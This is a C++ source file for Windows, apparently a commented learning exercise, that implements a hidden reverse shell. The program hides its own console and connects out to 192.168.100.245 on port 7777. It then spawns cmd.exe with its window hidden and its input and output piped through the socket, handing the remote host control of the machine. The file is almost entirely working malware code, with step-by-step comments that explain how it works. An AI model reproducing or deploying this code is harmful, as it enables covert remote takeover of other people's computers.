#include<iostream>
#include<winsock2.h>
#include<windows.h>
#pragma comment (lib,"ws2_32.lib")
#define PORT 7777
#define HostIP "192.168.100.245"

/* 

[ FreeConsole ] -> Hides the program's window from the user interface.
       ↓
[ WSAStartup  ] -> Initializes the Windows Sockets (Winsock) library.
       ↓
[ WSASocket   ] -> Creates an IPv4 TCP network socket wrapper.
       ↓
[ WSAConnect  ] -> Connects outbound to 192.168.100.245 on port 7777.
       ↓
[ recv()      ] -> Pauses execution until it receives an initial byte signal from the server.
       ↓
[ Handle Pipe ] -> Overrides si.hStdInput/Output/Error with the network socket handle.
       ↓
[CreateProcess] -> Spawns "cmd.exe" hidden (SW_HIDE) with stream redirection enabled.
       ↓
[ Wait / Close] -> Holds execution open until cmd.exe exits, then safely releases system handles.


*/
int main() {

    FreeConsole();

    SOCKET May;
    sockaddr_in May_addr;
    WSADATA kmkl; 
    unsigned char Recv[1000];
    int ex;

    STARTUPINFO si; 
    //This structure is used to specify exactly how the new
    // process's main window should look and behave when it first appears

    PROCESS_INFORMATION pi;
    //empty when created it
    //You pass its address to the operating system, and Windows populates it with 
    //identifying tracking details about the newly created process.
    
    /* 
    4 parameters of PROCESS_INFORMATION pi;
    pi.hProcess: A handle to the newly created process. 
    You can use this handle to monitor the program, check if it's still running,
    or force-terminate it.
     
    pi.hThread: A handle to the primary main execution thread inside the new process.
     
    pi.dwProcessId (PID): The unique numeric ID assigned to the process 
    by the operating system (visible in Task Manager).

    pi.dwThreadId: The unique numeric ID assigned to the primary thread.*/


    int wsastatus = WSAStartup(MAKEWORD(2,2) , &kmkl) ;

    if( wsastatus != 0 ) {
        WSACleanup();
        ExitProcess(EXIT_FAILURE);
    };

    May = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    May_addr.sin_port = htons(PORT);
    May_addr.sin_family = AF_INET;
    May_addr.sin_addr.s_addr = inet_addr(HostIP);

    ex = WSAConnect(May, (SOCKADDR*)&May_addr, sizeof(May_addr), NULL, NULL, NULL, NULL );

    if ( ex == SOCKET_ERROR ) {

        WSACleanup();
        ExitProcess(EXIT_FAILURE);
    } else {


        recv(May, (char*)Recv, sizeof(Recv) , 0);
        ZeroMemory(&si, sizeof(si) ) ;  // Wipes the memory to avoid random junk data
        si.cb = sizeof(si) ; // Tells Windows the exact size of this structure
        ZeroMemory(&pi, sizeof(pi));     // Wipes the memory clean


        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        //STARTF_USESTDHANDLES: "Listen to the custom input/output/error stream handles I am about to define."
        //STARTF_USESHOWWINDOW: "Listen to the custom window visibility instructions I am about to define."
        
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) May; //pipe to the socket
        si.wShowWindow = SW_HIDE;

        char commandLine[] = "cmd.exe";
        CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi );

        WaitForSingleObject(pi.hProcess, INFINITE) ;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        memset(Recv, 0 , sizeof(Recv) ) ;

        
        closesocket(May);
        WSACleanup();



    };



}

